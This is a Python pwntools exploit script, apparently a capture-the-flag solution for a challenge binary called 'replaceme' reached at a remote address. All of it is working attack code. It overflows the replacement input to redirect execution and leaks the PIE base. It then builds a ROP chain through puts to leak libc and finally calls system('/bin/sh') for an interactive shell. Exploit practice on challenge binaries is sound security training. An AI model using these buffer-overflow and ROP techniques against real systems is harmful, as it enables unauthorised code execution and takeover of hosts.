#!/usr/bin/env python3

from pwn import *

exe = ELF("./replaceme_patched")
libc = ELF("libc.so.6", checksec = False)
ld = ELF("./ld-2.31.so", checksec = False)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, "brva 0x15d8")
    else:
        r = remote("94.237.56.175", 51562)

    return r


def main():
    r = conn()

    exe.sym["pop_rdi"] = 0x1733

    r.sendafter(b"Input: ", b"A" * 127 + b"Z")
    # 'N' overwrites the first byte of return address and call main again
    r.sendafter(b"Replacement: ", b"s/Z/" + b"B" * 70 + b"CCC" + b"N/") # 'CCC' it's just a flag for recvuntil
    
    # Leak PIE
    r.recvuntil(b"CCC")
    exe.address = u64(r.recvn(6).ljust(8, b"\x00")) - exe.sym.main
    log.info(f"pie: 0x{exe.address:x}")

    # Leak libc and call main again
    r.sendafter(b"Input: ", b"A" * 127 + b"Z")
    r.sendafter(b"Replacement: ", b"s/Z/" + b"B" * 73 + p64(exe.sym["pop_rdi"]) + p64(exe.got.puts) + \
                                    p64(exe.plt.puts) + p64(exe.sym.main) + b"/")

    # Leak libc
    leak = r.recvlines(3)[-1][-6:]
    libc.address = u64(leak.ljust(8, b"\x00")) - libc.sym.puts
    log.info(f"libc: 0x{libc.address:x}")

    # Performa a ret2system as manual
    r.sendafter(b"Input: ", b"A" * 127 + b"Z")
    r.sendafter(b"Replacement: ", b"s/Z/" + b"B" * 73 + p64(exe.sym["pop_rdi"]) + \
                                    p64(libc.search(b"/bin/sh\x00").__next__()) + p64(libc.sym.system) + b"/")

    r.clean(1)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
